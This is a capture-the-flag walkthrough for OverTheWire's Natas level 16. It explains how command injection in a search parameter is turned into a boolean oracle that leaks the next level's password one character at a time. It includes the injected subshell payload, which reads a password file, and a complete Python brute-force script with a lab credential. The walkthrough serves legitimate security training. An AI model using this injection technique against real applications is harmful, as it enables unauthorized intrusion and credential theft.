# Natas16 

## Objective

Exploit a command injection vulnerability in the `needle` parameter to retrieve the password for the next level (`natas17`).

---

## Vulnerability Description

The application takes user input:

```
needle=
```

and uses it inside a shell command similar to:

```bash
grep <user_input> dictionary.txt
```

Because input is not properly sanitized, it allows **command injection**.

---

## Injection Technique

We can inject shell commands using:

```bash
$(command)
```

This executes the command before `grep` runs.

---

## Turning the Bug into an Oracle

Direct file reading is blocked, so instead, we test whether the password starts with a guessed prefix using:

```bash
grep ^prefix /etc/natas_webpass/natas17
```

We append a marker string:

```
zigzag
```

Final payload:

```bash
$(grep ^prefix /etc/natas_webpass/natas17)zigzag
```

---

## How the Oracle Works

**Case 1: Prefix is correct**

* `grep` finds a match
* output contains password line
* response is altered before reaching marker
* `"zigzag"` is **NOT** visible

**Case 2: Prefix is incorrect**

* `grep` returns nothing
* only `zigzag` remains
* `"zigzag"` IS visible

**Detection Logic**

```python
if "zigzag" not in response.text:
    # correct prefix found
```

---

## Exploitation Strategy

We reconstruct the password one character at a time:

1. Start with an empty string
2. Try all possible characters
3. Check which one produces a valid prefix
4. Append correct character
5. Repeat until length = 32

---

## Payload Format

```bash
$(grep ^{known_prefix + test_char} /etc/natas_webpass/natas17)zigzag
```

---

## Character Set

```python
import string
MATCHING_CHARS = string.ascii_letters + string.digits
```

---

## Exploit Script

```python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
u = "http://natas16.natas.labs.overthewire.org/"

PASSWORD_LENGTH = 32
MATCHING_CHARS = string.ascii_letters + string.digits

password = ""

while len(password) < PASSWORD_LENGTH:

    for c in MATCHING_CHARS:

        payload = "$(grep ^" + password + c + " /etc/natas_webpass/natas17)zigzag"
        url = u + "?needle=" + payload + "&submit=Search"

        response = requests.get(url, auth=basicAuth, verify=False)

        if "zigzag" not in response.text:
            password += c
            print("[+] Found:", password)
            break

print("\n[*] Final Password:", password)
```

---

## Complexity

* **Charset size:** ~62 characters
* **Password length:** 32 characters
* **Total requests:** ~2000
* **Estimated runtime:** 3–10 minutes

---

## Key Learnings

* Command injection via unsanitized input
* Subshell execution using `$(...)`
* Boolean oracle exploitation
* Side-channel data leakage
* Prefix-based brute force reconstruction

---


